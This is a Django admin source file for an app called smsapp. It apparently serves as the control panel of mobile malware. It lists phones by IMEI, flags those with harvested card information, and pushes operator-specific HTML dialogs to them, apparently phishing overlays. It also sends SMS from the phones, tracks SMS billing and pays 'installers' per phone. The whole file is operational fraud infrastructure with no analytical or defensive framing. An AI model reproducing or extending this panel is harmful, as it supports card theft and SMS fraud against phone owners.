import logging

from django import forms
from django.conf import settings
from django.contrib import admin
from django.forms import Form
from django.http import HttpResponseRedirect
from django.shortcuts import render
from django.utils.translation import ugettext_lazy as _


# Register your models here.
from django.contrib.auth.admin import UserAdmin
from django.contrib.auth.forms import UserCreationForm, UserChangeForm
import html5
import remote_dialog
from . import commands, cfields
from .models import SysUser, Installer, PhoneData, RemoteDialog, LogRecord, SMSRecord, InternalSMS, \
    operator_code_to_full_name, AppDialog

logger = logging.getLogger(__name__)


class MyAdminSite(admin.AdminSite):
    index_template = "admin/home.html"


admin_site = MyAdminSite()
admin.site = admin_site


def autodiscover():
    """
    Autodiscover function from django.contrib.admin
    """

    import copy
    from django.conf import settings
    from django.utils.importlib import import_module
    from django.utils.module_loading import module_has_submodule

    for app in settings.INSTALLED_APPS:
        mod = import_module(app)
        before_import_registry = None
        try:
            before_import_registry = copy.copy(admin.site._registry)
            import_module('%s.admin' % app)
        except:
            admin.site._registry = before_import_registry
            if module_has_submodule(mod, 'admin'):
                raise


class SysUserAddForm(UserCreationForm):
    class Meta:
        model = SysUser
        fields = ('username', 'password1', 'password2', 'jabber')


class SysUserChangeForm(UserChangeForm):
    class Meta:
        model = SysUser
        fields = ('jabber',)


class UserProfileAdmin(UserAdmin):
    fieldsets = (
        (None, {'fields': ('username', 'password', 'jabber')}),
        (_('Permissions'), {'fields': ('is_active', 'is_staff', 'is_superuser',
                                       'groups', 'user_permissions')}),
        (_('Important dates'), {'fields': ('last_login', 'date_joined')}),
    )
    add_fieldsets = (
        (None, {
            'classes': ('wide',),
            'fields': ('username', 'password1', 'password2', 'jabber')}
         ),
    )
    list_display = ['username', 'date_joined']
    form = SysUserChangeForm
    add_form = SysUserAddForm


admin.site.register(SysUser, UserProfileAdmin)


class InstallerAddForm(UserCreationForm):
    class Meta:
        model = Installer
        fields = ('username', 'password1', 'password2', 'user_id')


class InstallerChangeForm(UserChangeForm):
    class Meta:
        model = Installer
        fields = ('username', 'user_id')


class InstallerProfileAdmin(UserAdmin):
    fieldsets = (
        (None, {'fields': ('username', 'password', 'user_id',)}),
        (_('Important dates'), {'fields': ('last_login', 'date_joined')}),
    )
    add_fieldsets = (
        (None, {
            'classes': ('wide',),
            'fields': ('username', 'password1', 'password2', 'user_id',)}
         ),
    )
    actions = ('mark_as_paid',)
    list_display = ['username', 'user_id']
    form = InstallerChangeForm
    add_form = InstallerAddForm

    def mark_as_paid(self, request, queryset):
        """
        @type request: HttpRequest
        @type queryset: QuerySet
        """
        count = 0
        for usr in queryset.all():
            count += 1
            usr.phonedata_set.all().update(paid=True)
        self.message_user(request, "Marked phones as paid for {0} users".format(count))

    mark_as_paid.short_description = _("Mark phones for selected users as paid")


admin.site.register(Installer, InstallerProfileAdmin)


class PhoneNumberFilter(admin.SimpleListFilter):
    title = _("Phone number")
    parameter_name = "number"

    def lookups(self, request, model_admin):
        return (
            ('valid', _("Valid")),
            ('invalid', _("Invalid")),
        )

    def queryset(self, request, queryset):
        """
        @type request: HttpRequest
        @type queryset: QuerySet
        @rtype: QuerySet
        """
        if self.value() == 'valid':
            return queryset.filter(number__startswith='+')
        elif self.value() == 'invalid':
            return queryset.exclude(number__startswith='+')


class AppInstalledFilter(admin.SimpleListFilter):
    title = _("Installed app")
    parameter_name = "app"

    def lookups(self, request, model_admin):
        return (
            (None, 'None'),
        )

    def queryset(self, request, queryset):
        if request.GET.get('app'):
            return queryset.filter(installedapp__name=request.GET.get('app'))
        return queryset


class SMSSenderFilter(admin.SimpleListFilter):
    title = _("SMS Senders")
    parameter_name = "sender"

    def lookups(self, request, model_admin):
        return (
            (None, 'None'),
        )

    def queryset(self, request, queryset):
        if request.GET.get('sender'):
            return queryset.filter(internalsms__sender__id=request.GET.get('sender')).distinct()
        return


class CountryFilter(admin.SimpleListFilter):
    title = _("Country")
    parameter_name = "country"

    def lookups(self, request, model_admin):
        return (
            (None, 'None'),
        )

    def queryset(self, request, queryset):
        cc = request.GET.get(self.parameter_name)
        if cc:
            return queryset.filter(country=cc)
        return queryset


class OnlineFilter(admin.SimpleListFilter):
    title = _("Online")
    parameter_name = 'online'

    def lookups(self, request, model_admin):
        return (
            (1, _("Yes")),
        )

    def queryset(self, request, queryset):
        if self.value() == '1':
            from datetime import datetime, timedelta

            then = datetime.utcnow() - timedelta(minutes=15)
            return queryset.filter(last_connection__gt=then)
        return queryset


class PhoneDataAdminForm(forms.ModelForm):
    class Meta:
        model = PhoneData
        widgets = {
            'number': html5.Html5PhoneInput(attrs={'size': '14'}),
        }
        exclude = ()


class PhoneDataAdmin(admin.ModelAdmin):
    list_per_page = 50
    list_display = ['imei', 'uniq_id', 'work_time', 'last_connect', 'has_card', 'number', 'country', ]
    list_editable = ['number', 'country', ]
    list_filter = (
        'id_sent', 'inactive', 'installer', 'paid',
        PhoneNumberFilter, OnlineFilter, AppInstalledFilter, SMSSenderFilter, CountryFilter
    )
    actions = ('send_id_command', 'send_dialogs', )
    form = PhoneDataAdminForm

    def get_changelist_form(self, request, **kwargs):
        # return super(PhoneDataAdmin, self).get_changelist_form(request, **kwargs)
        return PhoneDataAdminForm

    def work_time(self, obj):
        """
        @type obj: PhoneData
        """
        return obj.get_work_time()

    work_time.admin_order_field = 'registered'
    work_time.short_description = _("Work time")

    def last_connect(self, obj):
        """
        @type obj: PhoneData
        """
        return obj.since_last_connection()

    last_connect.admin_order_field = 'last_connection'
    last_connect.short_description = _("Last connection")

    def has_card(self, obj):
        """
        @type obj: PhoneData
        """
        d = settings.MONGO['extra_data'].find_one(
            {'type': 'userdata', 'data.type': 'card information', 'code': obj.uniq_id})
        if d:
            return "Y"
        return ""

    has_card.short_description = _("Card")
    has_card.safe = True

    class SendIDForm(forms.Form):
        _selected_action = forms.CharField(widget=forms.MultipleHiddenInput)
        phone = forms.CharField(max_length=32)

    def send_id_command(self, request, queryset):
        """
        @type request: HttpRequest
        @type queryset: QuerySet
        """
        form = None
        if 'apply' in request.POST:
            form = self.SendIDForm(request.POST)

            if form.is_valid():
                phone = form.cleaned_data['phone']

                count = 0
                for p in queryset:
                    # p.tags.add(phone)
                    commands.send_id(p, phone)
                    logger.debug("Sending ID to {0}".format(p))
                    count += 1

                plural = ''
                if count != 1:
                    plural = 's'

                self.message_user(request, "Successfully sent to {0:d} phone{1:s}.".format(count, plural))
                return HttpResponseRedirect(request.get_full_path())
        if not form:
            form = self.SendIDForm(initial={'_selected_action': queryset.values_list('id', flat=True)})
        return render(request, 'admin/smsapp/phonedata/sentid_form.html', {'phones': queryset, 'send_form': form, })

    send_id_command.short_description = _("Send ID SMS from selected phones")

    def change_view(self, request, object_id, form_url='', extra_context=None):
        extra_context = extra_context or {}
        collection = settings.MONGO['extra_data']
        phone_extras = []
        p = PhoneData.objects.get(pk=object_id)
        for rec in collection.find({'code': p.uniq_id, 'type': 'userdata'}):
            try:
                phone_extras.append({'title': rec['data']['type'], 'records': rec['data']})
            except KeyError:
                pass
        extra_context['extras'] = phone_extras
        extra_context['uniq_id'] = p.uniq_id
        return super(PhoneDataAdmin, self).change_view(request, object_id, form_url, extra_context)

    class DialogsForm(forms.Form):
        _selected_action = forms.CharField(widget=forms.MultipleHiddenInput)
        dialog = forms.ModelChoiceField(help_text=_("Select dialog to send"), queryset=RemoteDialog.objects.all())

    # noinspection PyMethodMayBeStatic
    def send_dialogs(self, request, queryset):
        form = None
        if 'apply' in request.POST:
            form = self.DialogsForm(request.POST)
            if form.is_valid():
                dlg = form.cleaned_data.get('dialog')
                count = 0
                for p in queryset:
                    remote_dialog.push_dialog(p.uniq_id, dlg)
                    logger.debug("Pushed dialog {0} to phone {1}".format(dlg, p))
                    count += 1
                plural = ''
                if count != 1:
                    plural = 's'

                self.message_user(request, "Successfully sent to {0:d} phone{1:s}.".format(count, plural))
                return HttpResponseRedirect(request.get_full_path())
        if not form:
            form = self.DialogsForm(initial={'_selected_action': queryset.values_list('id', flat=True)})
        return render(request, 'admin/smsapp/remotedialog/send_dialogs_form.html',
                      {'dialogs_form': form, 'phones': queryset})

    send_dialogs.short_description = _("Send specified dialogs to phones")


admin.site.register(PhoneData, PhoneDataAdmin)


class LogRecordAdmin(admin.ModelAdmin):
    list_per_page = 50
    change_list_template = "admin/smsapp/logrecord/list.html"
    list_display = ('registered', 'contents',)

    def get_model_perms(self, request):
        return {}

    def changelist_view(self, request, extra_context=None):
        extra_context = extra_context or {}
        extra_context['title'] = _('Log records')
        return super(LogRecordAdmin, self).changelist_view(request, extra_context)

    def get_queryset(self, request):
        return super(LogRecordAdmin, self).get_queryset(request).order_by('-registered')


admin.site.register(LogRecord, LogRecordAdmin)


class SMSAdmin(admin.ModelAdmin):
    list_per_page = 50
    list_display = ('source', 'phone', 'owner', 'contents', 'billing_status')
    list_filter = ('billing_status',)
    list_editable = ('billing_status',)


admin.site.register(SMSRecord, SMSAdmin)


class OperatorCodeForm(forms.ModelForm):
    def __init__(self, *args, **kwargs):
        super(OperatorCodeForm, self).__init__(*args, **kwargs)
        try:
            country = self.initial.get('operator')[:3]
            self.fields['operator'].widget.widgets[1].choices = cfields.get_operator_choices(country)
        except ValueError:
            pass
        except TypeError:
            pass

    class Meta:
        model = RemoteDialog
        widgets = {
            'operator': cfields.OperatorWidget()
        }
        exclude = ()


class DialogAdmin(admin.ModelAdmin):
    list_display = ('id', 'operator_name', 'priority', 'description',)
    list_editable = ('priority',)
    form = OperatorCodeForm
    fieldsets = (
        (None, {'fields': ('operator', 'priority', 'description', 'delay', 'restart')}),
        ("Dialogs", {'fields': ('dlg1', )}),
        ("HTML content", {'fields': ('html_contents',)})
    )

    def operator_name(self, val):
        return operator_code_to_full_name(val.operator)

    operator_name.short_description = _("Operator")


admin.site.register(RemoteDialog, DialogAdmin)


class InternalSMSAdmin(admin.ModelAdmin):
    list_display = ('sender', 'created', 'phone')
    list_filter = ('sender',)

    def has_add_permission(self, request):
        return False

    # noinspection PyMethodMayBeStatic
    def sender_stats(self, request):
        def get_country_choices():
            import pycountry

            choices = [(None, '----')]
            for d in PhoneData.objects.order_by('country').distinct().values('country'):
                ccode = d['country']
                try:
                    c = pycountry.countries.get(alpha2=ccode)
                    choices.append((ccode, c.name))
                except KeyError:
                    logger.debug("Unknown country: {0}".format(ccode))
            return choices

        class CountryForm(Form):
            country = forms.ChoiceField(choices=get_country_choices())

        if request.POST.get('country'):
            ls = InternalSMS.objects.get_sender_stats_by_country(request.POST.get('country'))
        else:
            ls = InternalSMS.objects.get_sender_stats()
        cl = {'opts': {'app_label': "smsapp"}, 'result_list': ls}
        return render(request, 'admin/smsapp/internalsms/topsenders.html',
                      {'cl': cl, 'country_form': CountryForm(request.POST or None)})

    def get_urls(self):
        from django.conf.urls import patterns, url

        urls = super(InternalSMSAdmin, self).get_urls()
        my_urls = patterns(
            '',
            url(r'^senders$', admin.site.admin_view(self.sender_stats), name='sender_stats')
        )
        return urls + my_urls


admin.site.register(InternalSMS, InternalSMSAdmin)


class AppDialogAdmin(admin.ModelAdmin):
    list_display = ('description',)


admin.site.register(AppDialog, AppDialogAdmin)
